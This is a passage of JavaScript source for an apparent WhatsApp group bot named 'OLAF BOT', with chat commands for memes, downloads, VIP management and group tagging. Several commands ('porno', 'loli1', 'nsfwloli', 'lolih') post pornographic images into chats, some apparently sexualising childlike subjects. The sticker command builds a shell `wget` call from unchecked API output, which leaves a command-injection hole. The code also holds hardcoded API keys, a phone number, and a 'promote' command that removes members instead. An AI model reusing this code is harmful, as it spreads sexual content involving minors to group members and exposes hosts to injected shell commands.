jpg','https://cdn.nekos.life/wallpaper/sb9_J28pftY.jpg','https://cdn.nekos.life/wallpaper/JDoIi_IOB04.jpg','https://cdn.nekos.life/wallpaper/rG76AaUZXzk.jpg','https://cdn.nekos.life/wallpaper/9ru2luBo360.png','https://cdn.nekos.life/wallpaper/ghCgiWFxGwY.png','https://cdn.nekos.life/wallpaper/OSR-i-Rh7ZY.png','https://cdn.nekos.life/wallpaper/65VgtPyweCc.jpg','https://cdn.nekos.life/wallpaper/3vn-0FkNSbM.jpg','https://cdn.nekos.life/wallpaper/u02Y0-AJPL0.jpg','https://cdn.nekos.life/wallpaper/_-Z-0fGflRc.jpg','https://cdn.nekos.life/wallpaper/3VjNKqEPp58.jpg','https://cdn.nekos.life/wallpaper/NoG4lKnk6Sc.jpg','https://cdn.nekos.life/wallpaper/xiTxgRMA_IA.jpg','https://cdn.nekos.life/wallpaper/yq1ZswdOGpg.png','https://cdn.nekos.life/wallpaper/4SUxw4M3UMA.png','https://cdn.nekos.life/wallpaper/cUPnQOHNLg0.jpg','https://cdn.nekos.life/wallpaper/zczjuLWRisA.jpg','https://cdn.nekos.life/wallpaper/TcxvU_diaC0.png','https://cdn.nekos.life/wallpaper/7qqWhEF_uoY.jpg','https://cdn.nekos.life/wallpaper/J4t_7DvoUZw.jpg','https://cdn.nekos.life/wallpaper/xQ1Pg5D6J4U.jpg','https://cdn.nekos.life/wallpaper/aIMK5Ir4xho.jpg','https://cdn.nekos.life/wallpaper/6gneEXrNAWU.jpg','https://cdn.nekos.life/wallpaper/PSvNdoISWF8.jpg','https://cdn.nekos.life/wallpaper/SjgF2-iOmV8.jpg','https://cdn.nekos.life/wallpaper/vU54ikOVY98.jpg','https://cdn.nekos.life/wallpaper/QjnfRwkRU-Q.jpg','https://cdn.nekos.life/wallpaper/uSKqzz6ZdXc.png','https://cdn.nekos.life/wallpaper/AMrcxZOnVBE.jpg','https://cdn.nekos.life/wallpaper/N1l8SCMxamE.jpg','https://cdn.nekos.life/wallpaper/n2cBaTo-J50.png','https://cdn.nekos.life/wallpaper/ZXcaFmpOlLk.jpg','https://cdn.nekos.life/wallpaper/7bwxy3elI7o.png','https://cdn.nekos.life/wallpaper/7VW4HwF6LcM.jpg','https://cdn.nekos.life/wallpaper/YtrPAWul1Ug.png','https://cdn.nekos.life/wallpaper/1p4_Mmq95Ro.jpg','https://cdn.nekos.life/wallpaper/EY5qz5iebJw.png','https://cdn.nekos.life/wallpaper/aVDS6iEAIfw.jpg','https://cdn.nekos.life/wallpaper/veg_xpHQfjE.jpg','https://cdn.nekos.life/wallpaper/meaSEfeq9QM.png','https://cdn.nekos.life/wallpaper/Xa_GtsKsy-s.png','https://cdn.nekos.life/wallpaper/6Bx8R6D75eM.png','https://cdn.nekos.life/wallpaper/zXOGXH_b8VY.png','https://cdn.nekos.life/wallpaper/VQcviMxoQ00.png','https://cdn.nekos.life/wallpaper/CJnRl-PKWe8.png','https://cdn.nekos.life/wallpaper/zEWYfFL_Ero.png','https://cdn.nekos.life/wallpaper/_C9Uc5MPaz4.png','https://cdn.nekos.life/wallpaper/zskxNqNXyG0.jpg','https://cdn.nekos.life/wallpaper/g7w14PjzzcQ.jpg','https://cdn.nekos.life/wallpaper/KavYXR_GRB4.jpg','https://cdn.nekos.life/wallpaper/Z_r9WItzJBc.jpg','https://cdn.nekos.life/wallpaper/Qps-0JD6834.jpg','https://cdn.nekos.life/wallpaper/Ri3CiJIJ6M8.png','https://cdn.nekos.life/wallpaper/ArGYIpJwehY.jpg','https://cdn.nekos.life/wallpaper/uqYKeYM5h8w.jpg','https://cdn.nekos.life/wallpaper/h9cahfuKsRg.jpg','https://cdn.nekos.life/wallpaper/iNPWKO8d2a4.jpg','https://cdn.nekos.life/wallpaper/j2KoFVhsNig.jpg','https://cdn.nekos.life/wallpaper/z5Nc-aS6QJ4.jpg','https://cdn.nekos.life/wallpaper/VUFoK8l1qs0.png','https://cdn.nekos.life/wallpaper/rQ8eYh5mXN8.png','https://cdn.nekos.life/wallpaper/D3NxNISDavQ.png','https://cdn.nekos.life/wallpaper/Z_CiozIenrU.jpg','https://cdn.nekos.life/wallpaper/np8rpfZflWE.jpg','https://cdn.nekos.life/wallpaper/ED-fgS09gik.jpg','https://cdn.nekos.life/wallpaper/AB0Cwfs1X2w.jpg','https://cdn.nekos.life/wallpaper/DZBcYfHouiI.jpg','https://cdn.nekos.life/wallpaper/lC7pB-GRAcQ.png','https://cdn.nekos.life/wallpaper/zrI-sBSt2zE.png','https://cdn.nekos.life/wallpaper/_RJhylwaCLk.jpg','https://cdn.nekos.life/wallpaper/6km5m_GGIuw.png','https://cdn.nekos.life/wallpaper/3db40hylKs8.png','https://cdn.nekos.life/wallpaper/oggceF06ONQ.jpg','https://cdn.nekos.life/wallpaper/ELdH2W5pQGo.jpg','https://cdn.nekos.life/wallpaper/Zun_n5pTMRE.png','https://cdn.nekos.life/wallpaper/VqhFKG5U15c.png','https://cdn.nekos.life/wallpaper/NsMoiW8JZ60.jpg','https://cdn.nekos.life/wallpaper/XE4iXbw__Us.png','https://cdn.nekos.life/wallpaper/a9yXhS2zbhU.jpg','https://cdn.nekos.life/wallpaper/jjnd31_3Ic8.jpg','https://cdn.nekos.life/wallpaper/Nxanxa-xO3s.png','https://cdn.nekos.life/wallpaper/dBHlPcbuDc4.jpg','https://cdn.nekos.life/wallpaper/6wUZIavGVQU.jpg','https://cdn.nekos.life/wallpaper/_-Z-0fGflRc.jpg','https://cdn.nekos.life/wallpaper/H9OUpIrF4gU.jpg','https://cdn.nekos.life/wallpaper/xlRdH3fBMz4.jpg','https://cdn.nekos.life/wallpaper/7IzUIeaae9o.jpg','https://cdn.nekos.life/wallpaper/FZCVL6PyWq0.jpg','https://cdn.nekos.life/wallpaper/5dG-HH6d0yw.png','https://cdn.nekos.life/wallpaper/ddxyA37HiwE.png','https://cdn.nekos.life/wallpaper/I0oj_jdCD4k.jpg','https://cdn.nekos.life/wallpaper/ABchTV97_Ts.png','https://cdn.nekos.life/wallpaper/58C37kkq39Y.png','https://cdn.nekos.life/wallpaper/HMS5mK7WSGA.jpg','https://cdn.nekos.life/wallpaper/1O3Yul9ojS8.jpg','https://cdn.nekos.life/wallpaper/hdZI1XsYWYY.jpg','https://cdn.nekos.life/wallpaper/h8pAJJnBXZo.png','https://cdn.nekos.life/wallpaper/apO9K9JIUp8.jpg','https://cdn.nekos.life/wallpaper/p8f8IY_2mwg.jpg','https://cdn.nekos.life/wallpaper/HY1WIB2r_cE.jpg','https://cdn.nekos.life/wallpaper/u02Y0-AJPL0.jpg','https://cdn.nekos.life/wallpaper/jzN74LcnwE8.png','https://cdn.nekos.life/wallpaper/IeAXo5nJhjw.jpg','https://cdn.nekos.life/wallpaper/7lgPyU5fuLY.jpg','https://cdn.nekos.life/wallpaper/f8SkRWzXVxk.png','https://cdn.nekos.life/wallpaper/ZmDTpGGeMR8.jpg','https://cdn.nekos.life/wallpaper/AMrcxZOnVBE.jpg','https://cdn.nekos.life/wallpaper/ZhP-f8Icmjs.jpg','https://cdn.nekos.life/wallpaper/7FyUHX3fE2o.jpg','https://cdn.nekos.life/wallpaper/CZoSLK-5ng8.png','https://cdn.nekos.life/wallpaper/pSNDyxP8l3c.png','https://cdn.nekos.life/wallpaper/AhYGHF6Fpck.jpg','https://cdn.nekos.life/wallpaper/ic6xRRptRes.jpg','https://cdn.nekos.life/wallpaper/89MQq6KaggI.png','https://cdn.nekos.life/wallpaper/y1DlFeHHTEE.png']`, {method: 'get'})
						bufferttt = await getBuffer(res.result)
						client.sendMessage(from, bufferttt, image, {quoted: mek, caption: 'ksksks'})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('❌ *ERRO* ❌')
					}
					break
					case 'dado':    					
					kapankah = body.slice(1)
					const elu =['1','2','3','4','5','6','7','8','9','10','11']
					const ule = elu[Math.floor(Math.random() * elu.length)]
					client.sendMessage(from, ule, text, { quoted: mek })
					break
					case 'addvip':  
					if (!isOwner) return reply(mess.only.ownerB)
					if (!isPremium) return reply('Você não é um Membro Premium, entre em contato com o proprietário ou digite * # Daftarvip * para adquirir o acesso Premium!' ,text, { quoted: mek })
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('A marca-alvo que você quer chutar!')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = '╭────「 *PREMIUM👑* 」──*\n│+ *Número* : \n│+ *Expirado*: *30 Days*\n│+ *Status*: *ATIVO*\n│ Thx para atualizar para premium🥰\n*╰──────「 *posição* 」────'
						for (let _ of mentioned) {
							teks += `@${_.split('@')[0]}\n`
						}
						mentions(teks, mentioned, true)
						client.sendMessage(from, mentioned)
					} else {
						mentions(`╭────「 *PREMIUM👑* 」──*\n│+ *Número* : @${mentioned[0].split('@')[0]}\n│+ *Expirado*: *30 Days*\n│+ *Status*: *ATIVO*\n│ Thx para atualizar para premium🥰\n*╰──────「 *posição* 」────`, mentioned, true)
					client.sendMessage(from, mentioned)
				    }
					break
					case 'daftarvip': 
					client.sendMessage(from, daftarvip(prefix) , text, { quoted: mek })
					break
					case 'nekopoi':   
					
					client.sendMessage(from, nekopoi(prefix) , text, { quoted: mek })
					break
				case 'neko':
					gatauda = body.slice(6)
					reply(mess.wait)
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/nekonime?apikey=BotWeA`, {method: 'get'})
					buffer = await getBuffer(anu.result)
					client.sendMessage(from, buffer, image, {quoted: mek})
                    await limitAdd(sender)
					break	
					case 'cekvip': 
					if (!isPremium) return reply('Você não é um Membro Premium, entre em contato com o proprietário ou digite *.Daftarvip* para adquirir o acesso Premium!' ,text, { quoted: mek })
					me = client.user
					uptime = process.uptime()
					client.sendMessage(from,  `*──────────────────*\n*Nome do bot:* OLAF 𝐵𝑂𝑇\n*─────────────────*\n『 *𝐕𝐈𝐏 𝐔𝐒𝐄𝐑*』\n*──────────────────*\n*•Número:* *${sender.split("@s.whatsapp.net")[0]}*\n*•Status:* *ATIVO*\n*──────────────────*\n*Status Bot:* *${kyun(uptime)}*\n\n*VOCE É UM MEMBRO PREMIUM* 🐊🚩\n*──────────────────*` , text, { quoted: mek, })
					break
					case 'dellvip':
					if (!isOwner) return reply(mess.only.ownerB)
					if (!isPremium) return reply('Você não é um Membro Premium, entre em contato com o proprietário ou digite * # Daftarvip * para adquirir o acesso Premium!' ,text, { quoted: mek })
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di tendang!')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = '╭────「 *PREMIUM👑* 」──*\n│+ *Número* : \n│+ *Status*: *DEATIVO*\n│ Te vejo para o próximo pedido🙂\n*╰──────「 *posição* 」────'
						for (let _ of mentioned) {
							teks += `@${_.split('@')[0]}\n`
						}
						mentions(teks, mentioned, true)
						client.sendMessage(from, mentioned)
					} else {
						mentions(`╭────「 *PREMIUM👑* 」──*\n│+ *Número* : @${mentioned[0].split('@')[0]}\n│+ *Status*: *DEATIVO*\n│ Te vejo para o próximo pedido🙂\n*╰──────「 *posição* 」────`, mentioned, true)
					client.sendMessage(from, mentioned)
				    }
					break
					case 'ichiadmin':
					tod = await getBuffer(`https://i.ibb.co/XDwBVDJ/1f2652c622fa.jpg`)
					client.sendMessage(from, tod, image, { quoted: mek, caption: '*╭────*「 *ADMINBOT OLAF ✨* 」\n*│+ wa.me/5577991174304*╰──────*「 *OLAF* 」*────*\n\n*_SE QUER SER ADMIN DO BOT OLAF_*\n*_Tipo /iklan_*' })
					break
				case 'iklan':
					client.sendMessage(from, iklan(prefix) , text, { quoted: mek })
					break
					case 'premiumcek':
                    if (isBanned) return reply(mess.only.benned)    
				if (!isUser) return reply(mess.only.userB)
					sa = await getBuffer(`https://i.ibb.co/PcQ6tsB/79ac87b9358c.jpg`)
					client.sendMessage(from, sa, image, { quoted: mek, caption: '*╭────*「 *PREMIUM USER👑* 」\n*│+ wa.me/5577991174304*╰──────*「 * OLAF* 」*────*\n\n*_SE QUER SER UM USUÁRIO PREMIUM DO OLAF BOT_*\n*_Ketik #daftarvip*' })
					break
					case 'cekmod': 
 
					if (!isOwner) return reply(mess.only.ownerB)
                 if (!ismod) return reply('kamu Belum Terdaftar sebagai User Modbot')
                reply('kamu udah ke daftar sebagai user Modbot')
                break
                    case 'modbotlist':
					teks = 'Esta é a lista de usuários premium :\n'
					for (let p of mod) {
						teks += `~> @${p.split('@')[0]}\n`
					}
					teks += `Total : ${mod.length}`
					client.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": mod}})
					break
					case 'addpremium': 
					client.updatePresence(from, Presence.composing) 
 
					if (args.length < 1) return
					if (!isOwner) return reply(mess.only.ownerB)
					premium = args[0]
					reply(`Comando aceito adicionar usuário premium : ${premium}`)
					break
                 case 'calculadora':
				     if (args.length < 1) return reply(`[❗] Enviar pedidos *${prefix}calculadora [ Números ]*\nExemplo : ${prefix}calculadora 12*12\n*NOTA* :\n- Para multiplicação usando *\n- Para uso adicional +\n- Para redução do uso -\n- Para compartilhar usando /`)
				    mtk = `${body.slice(12)}`
				    anu = await fetchJson(`https://api.vhtear.com/calculator?value=${mtk}&apikey=${VthearApi}`, {method: 'get'})
				    client.sendMessage(from, `*${anu.result.data}*`, text, {quoted: mek})
				    await limitAdd(sender) 	
				    break 
				case 'porno':
				    if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					memein = await kagApi.memeindo()
					buffer = await getBuffer(`https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRdU0UmT8RigE3Hbr80gmigjb2AdnPJklcQ3A&usqp=CAU`)
					buffer = await getBuffer(`https://fotosdemulheresnuas.net/wp-content/uploads/2018/11/novinha-petuda-fotos-4.jpg`)
					buffer = await getBuffer(`https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSqWoYHFA_SDgUip6MtvimWRdub_lshAn5Edg&usqp=CAU`)
					buffer = await getBuffer(`https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRwvLmbqW9LeOCpXiGxgu3By4eQEmJM2Xp26Q&usqp=CAU`)
					buffer = await getBuffer(`https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRcnhmpQD1C1Dp7I2_kpi13gAsuoudOPPraog&usqp=CAU`)
					buffer = await getBuffer(`https://fotosdemulheresnuas.net/wp-content/uploads/2018/12/prima-novinha-pelada-6.jpg`)
					buffer = await getBuffer(`https://fotosdemulheresnuas.net/wp-content/uploads/2018/12/Mia-Khalifa-fotos-5.jpg`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: 'heheheheheh'})
					client.sendMessage(from, buffer, image, {quoted: mek, caption: 'heheheheheh'})
					client.sendMessage(from, buffer, image, {quoted: mek, caption: 'heheheheheh'})
					buffer = await getBuffer(`https://fotosdemulheresnuas.net/wp-content/uploads/2018/12/Mia-Khalifa-fotos-6.jpg`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: 'heheheheheh'})
					buffer = await getBuffer(`https://fotosdemulheresnuas.net/wp-content/uploads/2018/12/Mia-Khalifa-fotos-7.jpg`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: 'heheheheheh'})
					buffer = await getBuffer(`https://fotosdemulheresnuas.net/wp-content/uploads/2018/12/Mia-Khalifa-fotos-8.jpg`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: 'heheheheheh'})
					buffer = await getBuffer(`https://fotosdemulheresnuas.net/wp-content/uploads/2018/12/Mia-Khalifa-fotos-10.jpg`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: 'heheheheheh'})
					buffer = await getBuffer(`https://fotosdemulheresnuas.net/wp-content/uploads/2018/12/Mia-Khalifa-fotos-16.jpg`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: 'heheheheheh'})
					client.sendMessage(from, buffer, image, {quoted: mek, caption: 'heheheheheh'})
					client.sendMessage(from, buffer, image, {quoted: mek, caption: 'heheheheheh'})
					client.sendMessage(from, buffer, image, {quoted: mek, caption: 'heheheheheh'})
					client.sendMessage(from, buffer, image, {quoted: mek, caption: 'k'})
					break
				case 'belle2':
					memein = await kagApi.memeindo()
					buffer = await getBuffer(`https://i.pinimg.com/originals/24/5f/91/245f91208f9030724dbc8d1bede2e9ff.gif`)
					client.sendMessage(from, buffer, sticker, {quoted: mek, caption: 'slc'})
					break
				case 'bot':
			     	memein = await kagApi.memeindo()
					buffer = await getBuffer(`https://i.imgur.com/dPUVFF6.png`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: '*_Comandos basicos para bot:_*\n\n*pkg upgrade && pkg update*\n*pkg install git*\n*git clone (link da git)*\n*cd (repositório)*\n*bash install.sh*\n*npm start*\n\n*Olaf Domina*'})
					break
				case 'belle3':
					memein = await kagApi.memeindo()
					buffer = await getBuffer(`https://1.bp.blogspot.com/-3K_b14RzHTA/XwTW7SQTPRI/AAAAAAAAPtY/UOaKURECbzwXfvASa3g6Pz0D_Ha73Dw4wCLcBGAsYHQ/s1600/boabronha_10.jpg`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: 'olha p isso mano, pqp '})
					break
				case 'akeno':
					meme = await kagApi.memes()
					buffer = await getBuffer(`https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSnFAocqaur5ZX1DPN6ZGP8PJy2cNppas_gYA&usqp=CAU`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: '.......'})
					break
				case 'loli1':
					memein = await kagApi.memeindo()
					buffer = await getBuffer(`https://i.imgur.com/iphQUGi.jpg`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: 'hmm, então quer ver loli?'})
					break
				case 'hentai2':
					memein = await kagApi.memeindo()
					buffer = await getBuffer(`https://i.imgur.com/8U9GwX4.jpg`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: 'Cara bate pra 2d 😂'})
					break
				case 'bomdia':
					memein = await kagApi.memeindo()
					buffer = await getBuffer(`https://i.imgur.com/7VL9cFf.jpg`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: 'Bom dia, vcs sao fodas ❤️'})
					break
				case 'boatarde':
					memein = await kagApi.memeindo()
					buffer = await getBuffer(`https://i.imgur.com/JaO3yoV.jpg`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: 'Boa tarde, rapeize 😎👍'})
					break
				case 'boanoite':
					memein = await kagApi.memeindo()
					buffer = await getBuffer(`https://i.imgur.com/yOFxSUR.jpg`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: 'Boa noite fml ❤️'})
					break
                case 'belle':                 
				 data = fs.readFileSync('./src/belle.js');
                 jsonData = JSON.parse(data);
                 randIndex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[randIndex];
                hasil = await getBuffer(randKey.result)
                sendImage(hasil, mek, '*Belle :V*')
				break
				case 'belle1':
					memein = await kagApi.memeindo()
					buffer = await getBuffer(`https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSQ7ot6RZPnXSJFFKVjPoeXHjTYyi6uk5W_mA&usqp=CAU`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: '👀️'})
					break
				case 'lofi':
					memein = await kagApi.memeindo()
					buffer = await getBuffer(`https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTL9hZBPRo16fIhsIus3t1je2oAU23pQqBpfw&usqp=CAU`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: '️💆'})
					break
				case 'malkova':
					memein = await kagApi.memeindo()
					buffer = await getBuffer(`https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQtbo5EcVSGj-IvEVznHIgMZ9vjFptZfvprtg&usqp=CAU`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: '️💆'})
					break
				case 'nsfwloli1':
					memein = await kagApi.memeindo()
					buffer = await getBuffer(`https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRJhzKetbU3pzhoZdaIo6qBklCzwvmCCOznbg&usqp=CAU`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: 'Rum️'})
					break
				case 'reislin':
					memein = await kagApi.memeindo()
					buffer = await getBuffer(`https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQKlc2hMIJ4PjW5tIXltrKe6xeBoKPLKTZMnQ&usqp=CAU`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: '🤭'})
					break
				case 'boanoite':
					memein = await kagApi.memeindo()
					buffer = await getBuffer(`https://imgur.com/gallery/4HeRfuO`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: 'bom dia ❤️'})
					break
				case 'bomdia':
					memein = await kagApi.memeindo()
					buffer = await getBuffer(`https://imgur.com/gallery/zFvzl2S`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: 'bom dia ❤️'})
					break
				case 'termux':
					meme = await kagApi.memes()
					buffer = await getBuffer(`https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTgADDq_64EbTI0NroP7CUoVeWmu1J06NnGHw&usqp=CAU`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: 'Terminal é um programa muito conhecido no mundo das distribuições Linux. Ele é uma ferramenta que facilita muito nas tarefas relacionadas ao sistema. Agora, já pensou em utilizar o Terminal Linux no seu Android? Esta é a proposta do Termux.\n\n*TERMUX: UTILIZE O TERMINAL NO SEU ANDROID*\n\nA utilização do Terminal aumenta muito a produtividade do usuário que já possui um determinado nível de conhecimento técnico.\nCom o terminal, é possível fazer diversas e diferentes coisas, desde navegar entre os diretórios e instalar programas, até descompactar arquivos e monitorar os processos.'})
					break
		    	case 'grupoinfo':
                    client.updatePresence(from, Presence.composing)
                    if (!isGroup) return reply(mess.only.group)
                    ppUrl = await client.getProfilePicture(from) // leave empty to get your own
			        buffer = await getBuffer(ppUrl)
		            client.sendMessage(from, buffer, image, {quoted: mek, caption: `*NOME* : ${groupName}\n*MEMBRO* : ${groupMembers.length}\n*ADMIN* : ${groupAdmins.length}\n*DESCRIÇÃO* : ${groupDesc}`})
                    break
				case 'meme':
					reply(mess.wait)
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=MEME BRASIL`, {method: 'get'})
					ri = JSON.parse(JSON.stringify(anu));
					ze =  ri[Math.floor(Math.random() * ri.length)];
					nye = await getBuffer(ze)
					client.sendMessage(from, nye, image, { caption: 'cringe️', quoted: mek })
					await limitAdd(sender) 	
					break
				case 'memeindo':
					memein = await kagApi.memeindo()
					buffer = await getBuffer(`https://imgur.com/${memein.hash}.jpg`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: '.......'})
					break
				case 'setprefix':
					if (args.length < 1) return
					if (!isOwner) return reply(mess.only.ownerB)
					prefix = args[0]
					reply(`O prefixo foi alterado com sucesso para : ${prefix}`)
					break
				case 'loli':
					loli.getSFWLoli(async (err, res) => {
						if (err) return reply('❌ *ERROR* ❌')
						buffer = await getBuffer(res.url)
						client.sendMessage(from, buffer, image, {quoted: mek, caption: 'lolizinha'})
					})
					break					
                                case 'lolih':
                                        gatauda = body.slice(6)
                                                            reply(mess.wait)
                                        anu = await fetchJson(`https://tobz-api.herokuapp.com/api/randomloli?apikey=BotWeA`, {method: 'get'})
                                        buffer = await getBuffer(anu.result)
                                        client.sendMessage(from, buffer, image, {quoted: mek})
                                        await limitAdd(sender)
                                        break
				case 'nsfwloli':
					if (!isNsfw) return reply('*COMANDO SO FUNCIONA NO PV AMIGO.*')
					loli.getNSFWLoli(async (err, res) => {
						if (err) return reply('❌ *ERRO* ❌')
						buffer = await getBuffer(res.url)
						client.sendMessage(from, buffer, image, {quoted: mek, caption: 'Jangan jadiin bahan buat comli om'})
					})
					break
				case 'pronomeneu':
					if (args.length < 1) return reply('Onde está o texto, hum?')
					anu = await fetchJson(`https://mhankbarbars.herokuapp.com/api/hilih?teks=${body.slice(7)}`, {method: 'get'})
					reply(anu.result)
					break
				case 'yt2mp3':
					if (args.length < 1) return reply('Onde está o url, hum?')
					if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
					anu = await fetchJson(`https://mhankbarbars.herokuapp.com/api/yta?url=${args[0]}&apiKey=${apiKey}`, {method: 'get'})
					if (anu.error) return reply(anu.error)
					teks = `*Title* : ${anu.title}\n*Filesize* : ${anu.filesize}`
					thumb = await getBuffer(anu.thumb)
					client.sendMessage(from, thumb, image, {quoted: mek, caption: teks})
					buffer = await getBuffer(anu.result)
					client.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', filename: `${anu.title}.mp3`, quoted: mek})
					break
				case 'tiktok':
					if (args.length < 1) return reply('Onde está o url, hum?')
					if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.error.Iv)
					reply(mess.wait)
					anu = await fetchJson(`https://mhankbarbars.herokuapp.com/api/tiktok?url=${args[0]}&apiKey=${apiKey}`, {method: 'get'})
					if (anu.error) return reply(anu.error)
					buffer = await getBuffer(anu.result)
					client.sendMessage(from, buffer, video, {quoted: mek})
					break
				case 'tiktokstalk':
					try {
						if (args.length < 1) return client.sendMessage(from, 'Onde está o nome de usuário, hum', text, {quoted: mek})
						let { user, stats } = await tiktod.getUserProfileInfo(args[0])
						reply(mess.wait)
						teks = `*ID* : ${user.id}\n*Username* : ${user.uniqueId}\n*Nickname* : ${user.nickname}\n*Followers* : ${stats.followerCount}\n*Followings* : ${stats.followingCount}\n*Posts* : ${stats.videoCount}\n*Luv* : ${stats.heart}\n`
						buffer = await getBuffer(user.avatarLarger)
						client.sendMessage(from, buffer, image, {quoted: mek, caption: teks})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('Possível nome de usuário inválido')
					}
					break
				case 'url2img':
					tipelist = ['desktop','tablet','mobile']
					if (args.length < 1) return reply('Que tipo é??')
					if (!tipelist.includes(args[0])) return reply('Tipe desktop|tablet|mobile')
					if (args.length < 2) return reply('Cadê o url, hum?')
					if (!isUrl(args[1])) return reply(mess.error.Iv)
					reply(mess.wait)
					anu = await fetchJson(`https://mhankbarbars.herokuapp.com/api/url2image?tipe=${args[0]}&url=${args[1]}&apiKey=${apiKey}`, {method: 'get'})
					if (anu.error) return reply(anu.error)
					buff = await getBuffer(anu.result)
					client.sendMessage(from, buff, image, {quoted: mek})
					break
				case 'tstiker':
				case 'tsticker':
					if (args.length < 1) return reply('Onde está o texto, hum?')
					ranp = getRandom('.png')
					rano = getRandom('.webp')
					teks = body.slice(9).trim()
					anu = await fetchJson(`https://mhankbarbars.herokuapp.com/api/text2image?text=${teks}&apiKey=${apiKey}`, {method: 'get'})
					if (anu.error) return reply(anu.error)
					exec(`wget ${anu.result} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(ranp)
						if (err) return reply(mess.error.stick)
						client.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
						fs.unlinkSync(rano)
					})
					break
				case 'marcar':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += '\n\n'
					for (let mem of groupMembers) {
						teks += `*#* @${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					mentions(teks, members_id, true)
					break
                case 'marcar2':
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += '\n\n'
					for (let mem of groupMembers) {
						teks += `${line2} @${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					reply(teks)
					break
                 case 'marcar3':
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += '\n\n'
					for (let mem of groupMembers) {
						teks += `${line2} https://wa.me/${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					client.sendMessage(from, teks, text, {detectLinks: false, quoted: mek})
					break
				case 'limpar':
					if (!isOwner) return reply('Quem é Você?, Voce não é meu dono 😂')
					anu = await client.chats.all()
					client.setMaxListeners(25)
					for (let _ of anu) {
						client.deleteChat(_.jid)
					}
					reply('Excluido todos os chats com sucesso :)')
					break
				case 'bc':
					if (!isOwner) return reply('Quem é Você, você não é meu dono 😂?')
					if (args.length < 1) return reply('.......')
					anu = await client.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						buff = await client.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							client.sendMessage(_.jid, buff, image, {caption: `[ TRANSMIÇÃO DE AVISO ]\n\n${body.slice(4)}`})
						}
						reply('Transmissão enviada com sucesso')
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `[ TRANSMISSÃO DE AVISO ]\n\n${body.slice(4)}`)
						}
						reply('Transmissão enviada com sucesso')
					}
					break
        case 'promover':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = 'Berhasil Promote\n'
						for (let _ of mentioned) {
							teks += `@${_.split('@')[0]}\n`
						}
						mentions(from, mentioned, true)
						client.groupRemove(from, mentioned)
					} else {
